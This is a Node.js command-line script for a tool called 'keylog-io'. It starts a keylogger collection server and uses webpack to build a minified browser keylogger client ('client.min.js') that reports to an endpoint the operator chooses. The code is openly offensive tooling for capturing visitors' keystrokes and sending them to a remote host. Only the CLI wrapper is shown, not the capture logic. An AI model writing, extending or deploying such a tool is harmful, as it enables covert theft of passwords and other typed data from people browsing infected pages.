#!/usr/bin/env node

const path = require("path");
const program = require('commander');
const keyloggerServer = require('../main');
const {
  name,
  version,
  description
} = require('../package.json');

program
  .name('keylog-io')
  .version(version)
  .description(description);

// Start the keylog.io server
program
  .command('start')
  .description('Start the keylogger server')
  .option('-h, --hostname <host>', 'The address where start the server')
  .option('-p, --port <port>', 'The port where start the server', 9000)
  .option('-c, --client', 'Serve the client keylogger file')
  .option('-d, --demo', 'Serve the demo client page')
  .action(options => {
    console.log('Starting the keylogger server.');
    keyloggerServer({
      serveDemo: options.demo,
      serveClient: options.client,
      hostname: options.hostname,
      port: options.port
    });
  })

// Build keylogger client file for given endpoint
program
  .command('build <hostname> [port]')
  .description('Build the client flle for the given endpoint')
  .option('-o, --output <path>', 'Where to save the output file', './')
  .action((hostname, port, options) => {
    const webpack = require("webpack");

    let endpoint = port ? `${hostname}:${port}` : hostname
    let webpackConfig = require(path.resolve(__dirname, '../webpack.config.js'))

    // Override default config
    webpackConfig.output.path = path.resolve(options.output)
    webpackConfig.output.filename = 'client.min.js'
    webpackConfig.plugins[0] = new webpack.DefinePlugin({
      SERVER_URL: JSON.stringify(endpoint)
    })

    console.log('Building client file for:', endpoint, 'endpoint.', '\n');
    webpack(webpackConfig, (err, stats) => {
      if (err) {
        console.error(err.stack || err);
        if (err.details) {
          console.error(err.details);
        }
        return;
      }

      const info = stats.toJson();

      if (stats.hasErrors()) {
        console.error(info.errors);
      }

      if (stats.hasWarnings()) {
        console.warn(info.warnings);
      }

      console.log(stats.toString({
        chunks: false,
        colors: true
      }), '\n')

      console.log('Output saved to:', path.join(webpackConfig.output.path, webpackConfig.output.filename));
    })
  })

program.parse(process.argv);
